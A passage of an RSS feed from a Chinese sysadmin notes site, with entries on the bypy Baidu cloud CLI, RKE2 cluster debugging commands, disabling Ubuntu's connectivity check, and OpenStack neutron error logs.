<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bypy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>根据提示访问授权页面并获取授权码，然后将授权码输入到终端中完成配置。</p>
<h2>命令</h2>
<p>bypy 提供了多种操作命令，例如：</p>
<p><code>quota</code>: 显示百度云存储配额信息。</p>
<p><code>list</code>: 列出指定目录下的文件列表。</p>
<p><code>upload</code>: 上传本地文件到百度云。</p>
<p><code>download</code>: 从百度云下载文件到本地。</p>
<p><code>syncup</code>: 将本地文件同步到百度云。</p>
<p><code>syncdown</code>: 将百度云文件同步到本地。</p>
<p><code>delete</code>: 删除百度云上的文件。</p>
<p><code>makedir</code>: 在百度云上创建目录。</p>
<p><code>move</code>: 移动百度云上的文件。</p>
<p><code>copy</code>: 复制百度云上的文件。</p>
<p><code>compare</code>: 比较本地和云文件的差异。</p>
<h2>调试</h2>
<p>添加 <code>-v</code> 参数，会显示进度详情。</p>
<p>添加 <code>-d</code>，会显示一些调试信息。</p>
<p>添加 <code>-ddd</code>，显示 HTTP 通讯信息。</p>
<h2>使用示例</h2>
<h2>登录配置示例</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">test</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) [user @ cloud 20:17:08 /mnt/data/]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bypy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> info</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Please</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> visit:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">https://openapi.baidu.com/oauth/2.0/authorize?client_id</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=q8W</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">And</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> authorize</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> this</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Paste</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Authorization</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Code</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> here</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> within</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> minutes.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Press</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [Enter] when you are </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">done</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">c5c3085d143f880df0727d3f</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Authorizing,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> please</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> be</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> patient,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> it</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> may</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> take</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> upto</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 300</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> seconds...</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Quota:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 10.010TB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Used:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1.332TB</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>登录验证后会显示当前剩余存储空间和已用空间。</p>
<h3>主要参数</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bypy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -h</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>此命令会显示所有可用的命令行参数及其描述。</p>
<p><strong>命令行参数解释</strong></p>
<p>| 参数                            | 描述                                                         |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>rke2集群命令行调试方法</title>
      <link>https://www.geekery.cn/note-book/Rancher/rke2%E9%9B%86%E7%BE%A4%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95.html</link>
      <guid>https://www.geekery.cn/note-book/Rancher/rke2%E9%9B%86%E7%BE%A4%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95.html</guid>
      <source url="https://www.geekery.cn/rss.xml">rke2集群命令行调试方法</source>
      <description>rke2集群命令行调试方法 CLI 工具 RKE2 附带了多个 CLI 工具来帮助你访问和调试集群。启动时，它们会被提取到 /var/lib/rancher/rke2/bin。 kubectl admin kubeconfig 在 /etc/rancher/rke2/rke2.yaml 处生成。 示例： Containerd RKE2 附带了 ctr ...</description>
      <pubDate>Tue, 20 Aug 2024 10:33:13 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>CLI 工具</h2>
<p>RKE2 附带了多个 CLI 工具来帮助你访问和调试集群。启动时，它们会被提取到 <code>/var/lib/rancher/rke2/bin</code>。</p>
<h3>kubectl</h3>
<p>admin kubeconfig 在 <code>/etc/rancher/rke2/rke2.yaml</code> 处生成。</p>
<p>示例：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> KUBECONFIG</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">etc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">rancher</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">rke2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">rke2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">yaml</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/var/lib/rancher/rke2/bin/kubectl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nodes</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>Containerd</h3>
<p>RKE2 附带了 <code>ctr</code> 和 <code>crictl</code>。Containerd 套接字位于 <code>/run/k3s/containerd/containerd.sock</code>。</p>
<p>示例：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/var/lib/rancher/rke2/bin/ctr</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/k3s/containerd/containerd.sock</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --namespace</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> k8s.io</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> container</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> CRI_CONFIG_FILE</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">var</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">lib</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">rancher</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">rke2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">etc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">crictl</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">yaml</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/var/lib/rancher/rke2/bin/crictl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>Etcd</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">ETCDCTL_API</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">3</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> /var/lib/rancher/rke2/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/2/fs/usr/local/bin/etcdctl</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">	--cacert=/var/lib/rancher/rke2/server/tls/etcd/server-ca.crt</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">	--cert=/var/lib/rancher/rke2/server/tls/etcd/client.crt</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">	--key=/var/lib/rancher/rke2/server/tls/etcd/client.key</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">	--endpoints=127.0.0.1:2379</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">	--write-out=table</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> endpoint</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu隐私优化-关闭公共门户连接检查</title>
      <link>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E9%9A%90%E7%A7%81%E4%BC%98%E5%8C%96-%E5%85%B3%E9%97%AD%E5%85%AC%E5%85%B1%E9%97%A8%E6%88%B7%E8%BF%9E%E6%8E%A5%E6%A3%80%E6%9F%A5.html</link>
      <guid>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E9%9A%90%E7%A7%81%E4%BC%98%E5%8C%96-%E5%85%B3%E9%97%AD%E5%85%AC%E5%85%B1%E9%97%A8%E6%88%B7%E8%BF%9E%E6%8E%A5%E6%A3%80%E6%9F%A5.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Ubuntu隐私优化-关闭公共门户连接检查</source>
      <description>Ubuntu隐私优化-关闭公共门户连接检查 在研究 Ubuntu 的连接检查功能之前，让我们首先了解一下 Captive Portals。当尝试访问咖啡店、机场、商务中心、酒店大堂等处的 Wifi 设施时，我们发现自己登陆了一个要求身份验证、付款和/或接受协议条款的网页。只有当我们提供所需的信息时，我们才能访问 Wifi 设施。这种登录页面称为强制门户...</description>
      <pubDate>Wed, 14 Aug 2024 09:48:08 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>在研究 Ubuntu 的连接检查功能之前，让我们首先了解一下 Captive Portals。当尝试访问咖啡店、机场、商务中心、酒店大堂等处的  Wifi 设施时，我们发现自己登陆了一个要求身份验证、付款和/或接受协议条款的网页。只有当我们提供所需的信息时，我们才能访问 Wifi  设施。这种登录页面称为强制门户。</p>
<p>在 Ubuntu 17.10 及更高版本中，每当检测到强制门户时，您都会在网络状态中看到一个问号。这项新功能的工作原理是不时 ping <a href="http://connectivity-check.ubuntu.com" target="_blank" rel="noopener noreferrer">http://connectivity-check.ubuntu.com</a> URL，以检测强制门户。</p>
<p>为了更好的保证隐私，我将这个进行禁用。</p>
</blockquote>
<h2>通过命令行禁用连接检查</h2>
<p>通过 /var/lib/NetworkManager/NetworkManager-intern.conf 文件更改此功能的配置。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Internal configuration file. This file is written and read</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># by NetworkManager and its configuration values are merged</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># with the configuration from 'NetworkManager.conf'.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Keys with a ".set." prefix specify the value to set.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># A corresponding key with a ".was." prefix records the value</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># of the user configuration at the time of storing the file.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># The value from internal configuration is rejected if the corresponding</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ".was." key no longer matches the configuration from 'NetworkManager.conf'.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># That means, if you modify a value in 'NetworkManager.conf', the internal</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># overwrite no longer matches and is ignored.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Certain sections can only be overwritten whole, not on a per key basis.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Such sections are marked with a ".was" key that records the user configuration</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># at the time of writing.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Internal sections of the form [.intern.*] cannot</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># be set by user configuration.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># CHANGES TO THIS FILE WILL BE OVERWRITTEN</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>OpenStack排错</title>
      <link>https://www.geekery.cn/note-book/DistributedSystem/OpenStack/OpenStack%E6%8E%92%E9%94%99.html</link>
      <guid>https://www.geekery.cn/note-book/DistributedSystem/OpenStack/OpenStack%E6%8E%92%E9%94%99.html</guid>
      <source url="https://www.geekery.cn/rss.xml">OpenStack排错</source>
      <description>OpenStack排错 排错Exceeded maximum number of re tries. Exhausted all hosts available for retrying build 创建云主机报错Exceeded maximum number of re tries. Exhausted all hosts available for...</description>
      <pubDate>Fri, 02 Aug 2024 09:33:13 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>排错Exceeded maximum number of re tries. Exhausted all hosts available for retrying build</h2>
<p><strong>创建云主机报错Exceeded maximum number of re tries. Exhausted all hosts available for retrying build，无法创建云主机</strong></p>
<h3>控制节点 controller</h3>
<h4>neutron 日志分析</h4>
<p>grep ERROR /var/log/neutron/server.log</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:17:30.537</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 27477</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.managers</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-c117507f-a7fd-452d-a0a3-fcf928c7d115 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">66c4a34b461444afac62a6c7416c109b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> df1082a78def4615a858b64a6c12c198</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bind</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 6c119e38-8772-49f4-ada1-a4d8ae3073fd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vnic_type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> normal</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> using</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> segments</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [{</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'network_id'</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '328a483e-a346-448c-9c45-c26fd0162754',</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'segmentation_id':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'physical_network':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> None,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'id':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'e11308a4-d612-4604-851a-8aa90754885d',</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'network_type':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> u'vxlan'}]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:17:30.564</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 27477</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.managers</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-c117507f-a7fd-452d-a0a3-fcf928c7d115 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">66c4a34b461444afac62a6c7416c109b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> df1082a78def4615a858b64a6c12c198</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bind</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 6c119e38-8772-49f4-ada1-a4d8ae3073fd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vnic_type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> normal</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> using</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> segments</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [{</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'network_id'</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '328a483e-a346-448c-9c45-c26fd0162754',</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'segmentation_id':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'physical_network':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> None,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'id':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'e11308a4-d612-4604-851a-8aa90754885d',</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'network_type':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> u'vxlan'}]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:17:30.588</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 27477</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.managers</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-c117507f-a7fd-452d-a0a3-fcf928c7d115 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">66c4a34b461444afac62a6c7416c109b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> df1082a78def4615a858b64a6c12c198</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bind</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 6c119e38-8772-49f4-ada1-a4d8ae3073fd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vnic_type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> normal</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> using</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> segments</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [{</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'network_id'</span><span 